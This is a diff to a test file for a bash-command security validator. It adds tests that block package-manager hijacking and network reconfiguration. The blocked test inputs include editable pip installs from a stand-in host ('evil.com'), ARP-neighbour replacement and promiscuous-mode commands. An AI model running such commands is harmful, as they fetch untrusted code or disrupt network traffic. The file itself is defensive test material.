@@ -28,6 +28,8 @@ import {
   detectBase64ShellPipe,
   detectPrivilegeEscalation,
   detectContainerEscape,
+  detectPackageManagerHijack,
+  detectNetworkManipulation,
 } from '../src/tools/bash-security';
 
 // ---------------------------------------------------------------------------
@@ -1969,5 +1971,559 @@ describe('validateBashSecurity privilege escalation integration', () => {
 
   it('allows chown user:group via validateBashSecurity', () => {
     assert.equal(validateBashSecurity('chown deploy:deploy app').safe, true);
+  });
+});
+
+// ---------------------------------------------------------------------------
+// detectPackageManagerHijack
+// ---------------------------------------------------------------------------
+
+describe('detectPackageManagerHijack', () => {
+  // --- pip install --target / -t ---
+  it('blocks pip install --target .', () => {
+    const r = detectPackageManagerHijack('pip install --target . requests');
+    assert.equal(r.blocked, true);
+    assert.ok(r.reason!.includes('--target'));
+  });
+
+  it('blocks pip install -t /tmp/lib package', () => {
+    const r = detectPackageManagerHijack('pip install -t /tmp/lib package');
+    assert.equal(r.blocked, true);
+    assert.ok(r.reason!.includes('--target'));
+  });
+
+  it('blocks pip3 install --target=./vendor package', () => {
+    const r = detectPackageManagerHijack('pip3 install --target=./vendor package');
+    assert.equal(r.blocked, true);
+    assert.ok(r.reason!.includes('--target'));
+  });
+
+  // --- pip install --user --prefix ---
+  it('blocks pip install --user --prefix /custom/path', () => {
+    const r = detectPackageManagerHijack('pip install --user --prefix /custom/path requests');
+    assert.equal(r.blocked, true);
+    assert.ok(r.reason!.includes('--prefix'));
+  });
+
+  it('blocks pip install --prefix=/weird --user package', () => {
+    const r = detectPackageManagerHijack('pip install --prefix=/weird --user package');
+    assert.equal(r.blocked, true);
+    assert.ok(r.reason!.includes('--prefix'));
+  });
+
+  // --- pip install -e with remote URL ---
+  it('blocks pip install -e https://evil.com/repo', () => {
+    const r = detectPackageManagerHijack('pip install -e https://evil.com/repo');
+    assert.equal(r.blocked, true);
+    assert.ok(r.reason!.includes('setup.py'));
+  });
+
+  it('blocks pip install --editable git+https://github.com/user/repo', () => {
+    const r = detectPackageManagerHijack('pip install --editable git+https://github.com/user/repo');
+    assert.equal(r.blocked, true);
+    assert.ok(r.reason!.includes('setup.py'));
+  });
+
+  it('blocks pip install -e git://evil.com/repo', () => {
+    const r = detectPackageManagerHijack('pip install -e git://evil.com/repo');
+    assert.equal(r.blocked, true);
+    assert.ok(r.reason!.includes('setup.py'));
+  });
+
+  // --- npm link ---
+  it('blocks npm link', () => {
+    const r = detectPackageManagerHijack('npm link');
+    assert.equal(r.blocked, true);
+    assert.ok(r.reason!.includes('npm link'));
+  });
+
+  it('blocks npm link somepackage', () => {
+    const r = detectPackageManagerHijack('npm link somepackage');
+    assert.equal(r.blocked, true);
+    assert.ok(r.reason!.includes('npm link'));
+  });
+
+  // --- npm install --global-style ---
+  it('blocks npm install --global-style', () => {
+    const r = detectPackageManagerHijack('npm install --global-style');
+    assert.equal(r.blocked, true);
+    assert.ok(r.reason!.includes('--global-style'));
+  });
+
+  // --- gem install --install-dir / -i ---
+  it('blocks gem install --install-dir ./gems package', () => {
+    const r = detectPackageManagerHijack('gem install --install-dir ./gems package');
+    assert.equal(r.blocked, true);
+    assert.ok(r.reason!.includes('--install-dir'));
+  });
+
+  it('blocks gem install --install-dir=./vendor/bundle package', () => {
+    const r = detectPackageManagerHijack('gem install --install-dir=./vendor/bundle package');
+    assert.equal(r.blocked, true);
+    assert.ok(r.reason!.includes('--install-dir'));
+  });
+
+  it('blocks gem install -i /project/lib package', () => {
+    const r = detectPackageManagerHijack('gem install -i /project/lib package');
+    assert.equal(r.blocked, true);
+    assert.ok(r.reason!.includes('--install-dir'));
+  });
+
+  // --- allowed commands ---
+  it('allows pip install package', () => {
+    const r = detectPackageManagerHijack('pip install requests');
+    assert.equal(r.blocked, false);
+  });
+
+  it('allows pip install -r requirements.txt', () => {
+    const r = detectPackageManagerHijack('pip install -r requirements.txt');
+    assert.equal(r.blocked, false);
+  });
+
+  it('allows pip install --upgrade pip', () => {
+    const r = detectPackageManagerHijack('pip install --upgrade pip');
+    assert.equal(r.blocked, false);
+  });
+
+  it('allows pip install -e ./local-package (local editable)', () => {
+    const r = detectPackageManagerHijack('pip install -e ./local-package');
+    assert.equal(r.blocked, false);
+  });
+
+  it('allows pip install -e /absolute/local/path', () => {
+    const r = detectPackageManagerHijack('pip install -e /absolute/local/path');
+    assert.equal(r.blocked, false);
+  });
+
+  it('allows npm install', () => {
+    const r = detectPackageManagerHijack('npm install');
+    assert.equal(r.blocked, false);
+  });
+
+  it('allows npm install package', () => {
+    const r = detectPackageManagerHijack('npm install express');
+    assert.equal(r.blocked, false);
+  });
+
+  it('allows npm install --save-dev package', () => {
+    const r = detectPackageManagerHijack('npm install --save-dev typescript');
+    assert.equal(r.blocked, false);
+  });
+
+  it('allows gem install package', () => {
+    const r = detectPackageManagerHijack('gem install rails');
+    assert.equal(r.blocked, false);
+  });
+
+  it('allows gem install --user-install package', () => {
+    const r = detectPackageManagerHijack('gem install --user-install rails');
+    assert.equal(r.blocked, false);
+  });
+
+  it('allows pip freeze', () => {
+    const r = detectPackageManagerHijack('pip freeze');
+    assert.equal(r.blocked, false);
+  });
+
+  it('allows npm ls', () => {
+    const r = detectPackageManagerHijack('npm ls');
+    assert.equal(r.blocked, false);
+  });
+
+  it('allows npm ci', () => {
+    const r = detectPackageManagerHijack('npm ci');
+    assert.equal(r.blocked, false);
+  });
+
+  it('allows non-package-manager commands', () => {
+    const r = detectPackageManagerHijack('ls -la');
+    assert.equal(r.blocked, false);
+  });
+});
+
+// ---------------------------------------------------------------------------
+// detectPackageManagerHijack integration with validateBashSecurity
+// ---------------------------------------------------------------------------
+
+describe('validateBashSecurity package manager hijack integration', () => {
+  it('blocks pip install --target via validateBashSecurity', () => {
+    const r = validateBashSecurity('pip install --target . requests');
+    assert.equal(r.safe, false);
+    assert.equal(r.checkId, CHECK_IDS.PACKAGE_MANAGER_HIJACK);
+  });
+
+  it('blocks pip install -t via validateBashSecurity', () => {
+    const r = validateBashSecurity('pip install -t /tmp/lib package');
+    assert.equal(r.safe, false);
+    assert.equal(r.checkId, CHECK_IDS.PACKAGE_MANAGER_HIJACK);
+  });
+
+  it('blocks pip install -e with URL via validateBashSecurity', () => {
+    const r = validateBashSecurity('pip install -e https://evil.com/repo');
+    assert.equal(r.safe, false);
+    assert.equal(r.checkId, CHECK_IDS.PACKAGE_MANAGER_HIJACK);
+  });
+
+  it('blocks npm link via validateBashSecurity', () => {
+    const r = validateBashSecurity('npm link');
+    assert.equal(r.safe, false);
+    assert.equal(r.checkId, CHECK_IDS.PACKAGE_MANAGER_HIJACK);
+  });
+
+  it('blocks npm install --global-style via validateBashSecurity', () => {
+    const r = validateBashSecurity('npm install --global-style');
+    assert.equal(r.safe, false);
+    assert.equal(r.checkId, CHECK_IDS.PACKAGE_MANAGER_HIJACK);
+  });
+
+  it('blocks gem install --install-dir via validateBashSecurity', () => {
+    const r = validateBashSecurity('gem install --install-dir ./gems rails');
+    assert.equal(r.safe, false);
+    assert.equal(r.checkId, CHECK_IDS.PACKAGE_MANAGER_HIJACK);
+  });
+
+  it('blocks gem install -i via validateBashSecurity', () => {
+    const r = validateBashSecurity('gem install -i /project/lib rails');
+    assert.equal(r.safe, false);
+    assert.equal(r.checkId, CHECK_IDS.PACKAGE_MANAGER_HIJACK);
+  });
+
+  it('allows pip install package via validateBashSecurity', () => {
+    assert.equal(validateBashSecurity('pip install requests').safe, true);
+  });
+
+  it('allows pip install -r requirements.txt via validateBashSecurity', () => {
+    assert.equal(validateBashSecurity('pip install -r requirements.txt').safe, true);
+  });
+
+  it('allows npm install via validateBashSecurity', () => {
+    assert.equal(validateBashSecurity('npm install').safe, true);
+  });
+
+  it('allows npm install package via validateBashSecurity', () => {
+    assert.equal(validateBashSecurity('npm install express').safe, true);
+  });
+
+  it('allows gem install package via validateBashSecurity', () => {
+    assert.equal(validateBashSecurity('gem install rails').safe, true);
+  });
+});
+
+// ---------------------------------------------------------------------------
+// detectNetworkManipulation
+// ---------------------------------------------------------------------------
+
+describe('detectNetworkManipulation', () => {
+  // --- Blocked: ip link set ---
+  it('blocks ip link set', () => {
+    const r = detectNetworkManipulation('ip link set eth0 down');
+    assert.equal(r.blocked, true);
+    assert.ok(r.reason!.includes('ip link set'));
+  });
+
+  it('blocks ip link set with flags', () => {
+    const r = detectNetworkManipulation('ip -s link set eth0 up');
+    assert.equal(r.blocked, true);
+  });
+
+  // --- Blocked: ip addr add/del ---
+  it('blocks ip addr add', () => {
+    const r = detectNetworkManipulation('ip addr add 192.168.1.1/24 dev eth0');
+    assert.equal(r.blocked, true);
+    assert.ok(r.reason!.includes('ip addr add/del'));
+  });
+
+  it('blocks ip addr del', () => {
+    const r = detectNetworkManipulation('ip addr del 192.168.1.1/24 dev eth0');
+    assert.equal(r.blocked, true);
+  });
+
+  it('blocks ip addr delete', () => {
+    const r = detectNetworkManipulation('ip addr delete 10.0.0.1/8 dev lo');
+    assert.equal(r.blocked, true);
+  });
+
+  it('blocks ip addr add with flags', () => {
+    const r = detectNetworkManipulation('ip -4 addr add 10.0.0.1/24 dev wlan0');
+    assert.equal(r.blocked, true);
+  });
+
+  // --- Blocked: ip route add/del ---
+  it('blocks ip route add', () => {
+    const r = detectNetworkManipulation('ip route add default via 192.168.1.1');
+    assert.equal(r.blocked, true);
+    assert.ok(r.reason!.includes('ip route add/del'));
+  });
+
+  it('blocks ip route del', () => {
+    const r = detectNetworkManipulation('ip route del default');
+    assert.equal(r.blocked, true);
+  });
+
+  it('blocks ip route replace', () => {
+    const r = detectNetworkManipulation('ip route replace default via 10.0.0.1');
+    assert.equal(r.blocked, true);
+  });
+
+  it('blocks ip route change', () => {
+    const r = detectNetworkManipulation('ip route change 192.168.0.0/16 via 10.0.0.1');
+    assert.equal(r.blocked, true);
+  });
+
+  it('blocks ip route append', () => {
+    const r = detectNetworkManipulation('ip route append 192.168.0.0/16 via 10.0.0.1');
+    assert.equal(r.blocked, true);
+  });
+
+  it('blocks ip route prepend', () => {
+    const r = detectNetworkManipulation('ip route prepend default via 10.0.0.1');
+    assert.equal(r.blocked, true);
+  });
+
+  it('blocks ip route delete', () => {
+    const r = detectNetworkManipulation('ip route delete 192.168.1.0/24');
+    assert.equal(r.blocked, true);
+  });
+
+  // --- Blocked: ip rule add/del ---
+  it('blocks ip rule add', () => {
+    const r = detectNetworkManipulation('ip rule add from 192.168.1.0/24 table 100');
+    assert.equal(r.blocked, true);
+    assert.ok(r.reason!.includes('ip rule add/del'));
+  });
+
+  it('blocks ip rule del', () => {
+    const r = detectNetworkManipulation('ip rule del from 192.168.1.0/24');
+    assert.equal(r.blocked, true);
+  });
+
+  it('blocks ip rule delete', () => {
+    const r = detectNetworkManipulation('ip rule delete from all');
+    assert.equal(r.blocked, true);
+  });
+
+  // --- Blocked: ip neigh add/del ---
+  it('blocks ip neigh add', () => {
+    const r = detectNetworkManipulation('ip neigh add 192.168.1.1 lladdr aa:bb:cc:dd:ee:ff dev eth0');
+    assert.equal(r.blocked, true);
+    assert.ok(r.reason!.includes('ip neigh add/del'));
+  });
+
+  it('blocks ip neigh del', () => {
+    const r = detectNetworkManipulation('ip neigh del 192.168.1.1 dev eth0');
+    assert.equal(r.blocked, true);
+  });
+
+  it('blocks ip neigh replace', () => {
+    const r = detectNetworkManipulation('ip neigh replace 192.168.1.1 lladdr ff:ff:ff:ff:ff:ff dev eth0');
+    assert.equal(r.blocked, true);
+  });
+
+  it('blocks ip neigh change', () => {
+    const r = detectNetworkManipulation('ip neigh change 192.168.1.1 lladdr aa:bb:cc:dd:ee:ff dev eth0');
+    assert.equal(r.blocked, true);
+  });
+
+  it('blocks ip neigh delete', () => {
+    const r = detectNetworkManipulation('ip neigh delete 192.168.1.1 dev eth0');
+    assert.equal(r.blocked, true);
+  });
+
+  // --- Blocked: ifconfig set operations ---
+  it('blocks ifconfig with IP address assignment', () => {
+    const r = detectNetworkManipulation('ifconfig eth0 192.168.1.1');
+    assert.equal(r.blocked, true);
+    assert.ok(r.reason!.includes('ifconfig'));
+  });
+
+  it('blocks ifconfig with up', () => {
+    const r = detectNetworkManipulation('ifconfig eth0 up');
+    assert.equal(r.blocked, true);
+  });
+
+  it('blocks ifconfig with down', () => {
+    const r = detectNetworkManipulation('ifconfig eth0 down');
+    assert.equal(r.blocked, true);
+  });
+
+  it('blocks ifconfig with netmask', () => {
+    const r = detectNetworkManipulation('ifconfig eth0 netmask 255.255.255.0');
+    assert.equal(r.blocked, true);
+  });
+
+  it('blocks ifconfig with broadcast', () => {
+    const r = detectNetworkManipulation('ifconfig eth0 broadcast 192.168.1.255');
+    assert.equal(r.blocked, true);
+  });
+
+  it('blocks ifconfig with mtu', () => {
+    const r = detectNetworkManipulation('ifconfig eth0 mtu 9000');
+    assert.equal(r.blocked, true);
+  });
+
+  it('blocks ifconfig with promisc', () => {
+    const r = detectNetworkManipulation('ifconfig eth0 promisc');
+    assert.equal(r.blocked, true);
+  });
+
+  it('blocks ifconfig with pointopoint', () => {
+    const r = detectNetworkManipulation('ifconfig tun0 pointopoint 10.0.0.1');
+    assert.equal(r.blocked, true);
+  });
+
+  it('blocks ifconfig with IP and netmask combined', () => {
+    const r = detectNetworkManipulation('ifconfig eth0 192.168.1.100 netmask 255.255.255.0');
+    assert.equal(r.blocked, true);
+  });
+
+  // --- Allowed: read-only ip commands ---
+  it('allows ip addr show', () => {
+    const r = detectNetworkManipulation('ip addr show');
+    assert.equal(r.blocked, false);
+  });
+
+  it('allows ip addr list', () => {
+    const r = detectNetworkManipulation('ip addr list');
+    assert.equal(r.blocked, false);
+  });
+
+  it('allows ip addr', () => {
+    const r = detectNetworkManipulation('ip addr');
+    assert.equal(r.blocked, false);
+  });
+
+  it('allows ip link show', () => {
+    const r = detectNetworkManipulation('ip link show');
+    assert.equal(r.blocked, false);
+  });
+
+  it('allows ip route show', () => {
+    const r = detectNetworkManipulation('ip route show');
+    assert.equal(r.blocked, false);
+  });
+
+  it('allows ip route list', () => {
+    const r = detectNetworkManipulation('ip route list');
+    assert.equal(r.blocked, false);
+  });
+
+  it('allows ip route', () => {
+    const r = detectNetworkManipulation('ip route');
+    assert.equal(r.blocked, false);
+  });
+
+  it('allows ip -s link', () => {
+    const r = detectNetworkManipulation('ip -s link');
+    assert.equal(r.blocked, false);
+  });
+
+  it('allows ip -brief addr', () => {
+    const r = detectNetworkManipulation('ip -brief addr');
+    assert.equal(r.blocked, false);
+  });
+
+  it('allows ip neigh show', () => {
+    const r = detectNetworkManipulation('ip neigh show');
+    assert.equal(r.blocked, false);
+  });
+
+  it('allows ip rule show', () => {
+    const r = detectNetworkManipulation('ip rule show');
+    assert.equal(r.blocked, false);
+  });
+
+  it('allows ip rule list', () => {
+    const r = detectNetworkManipulation('ip rule list');
+    assert.equal(r.blocked, false);
+  });
+
+  // --- Allowed: read-only ifconfig commands ---
+  it('allows ifconfig with no args', () => {
+    const r = detectNetworkManipulation('ifconfig');
+    assert.equal(r.blocked, false);
+  });
+
+  it('allows ifconfig showing single interface', () => {
+    const r = detectNetworkManipulation('ifconfig eth0');
+    assert.equal(r.blocked, false);
+  });
+
+  // --- Non-matching commands ---
+  it('does not match ip inside other commands (e.g. grip)', () => {
+    const r = detectNetworkManipulation('grip file.md');
+    assert.equal(r.blocked, false);
+  });
+
+  it('does not match ip inside other commands (e.g. unzip)', () => {
+    const r = detectNetworkManipulation('unzip archive.zip');
+    assert.equal(r.blocked, false);
+  });
+});
+
+// ---------------------------------------------------------------------------
+// detectNetworkManipulation integration with validateBashSecurity
+// ---------------------------------------------------------------------------
+
+describe('validateBashSecurity network manipulation integration', () => {
+  it('blocks ip link set via validateBashSecurity', () => {
+    const r = validateBashSecurity('ip link set eth0 down');
+    assert.equal(r.safe, false);
+    assert.equal(r.checkId, CHECK_IDS.NETWORK_MANIPULATION);
+  });
+
+  it('blocks ip addr add via validateBashSecurity', () => {
+    const r = validateBashSecurity('ip addr add 10.0.0.1/24 dev eth0');
+    assert.equal(r.safe, false);
+    assert.equal(r.checkId, CHECK_IDS.NETWORK_MANIPULATION);
+  });
+
+  it('blocks ip route add via validateBashSecurity', () => {
+    const r = validateBashSecurity('ip route add default via 10.0.0.1');
+    assert.equal(r.safe, false);
+    assert.equal(r.checkId, CHECK_IDS.NETWORK_MANIPULATION);
+  });
+
+  it('blocks ip rule add via validateBashSecurity', () => {
+    const r = validateBashSecurity('ip rule add from 10.0.0.0/8 table 100');
+    assert.equal(r.safe, false);
+    assert.equal(r.checkId, CHECK_IDS.NETWORK_MANIPULATION);
+  });
+
+  it('blocks ip neigh add via validateBashSecurity', () => {
+    const r = validateBashSecurity('ip neigh add 192.168.1.1 lladdr aa:bb:cc:dd:ee:ff dev eth0');
+    assert.equal(r.safe, false);
+    assert.equal(r.checkId, CHECK_IDS.NETWORK_MANIPULATION);
+  });
+
+  it('blocks ifconfig with IP via validateBashSecurity', () => {
+    const r = validateBashSecurity('ifconfig eth0 192.168.1.1');
+    assert.equal(r.safe, false);
+    assert.equal(r.checkId, CHECK_IDS.NETWORK_MANIPULATION);
+  });
+
+  it('blocks ifconfig down via validateBashSecurity', () => {
+    const r = validateBashSecurity('ifconfig eth0 down');
+    assert.equal(r.safe, false);
+    assert.equal(r.checkId, CHECK_IDS.NETWORK_MANIPULATION);
+  });
+
+  it('allows ip addr show via validateBashSecurity', () => {
+    assert.equal(validateBashSecurity('ip addr show').safe, true);
+  });
+
+  it('allows ip route show via validateBashSecurity', () => {
+    assert.equal(validateBashSecurity('ip route show').safe, true);
+  });
+
+  it('allows ip link show via validateBashSecurity', () => {
+    assert.equal(validateBashSecurity('ip link show').safe, true);
+  });
+
+  it('allows ifconfig (no args) via validateBashSecurity', () => {
+    assert.equal(validateBashSecurity('ifconfig').safe, true);
+  });
+
+  it('allows ifconfig eth0 (show single) via validateBashSecurity', () => {
+    assert.equal(validateBashSecurity('ifconfig eth0').safe, true);
   });
 });
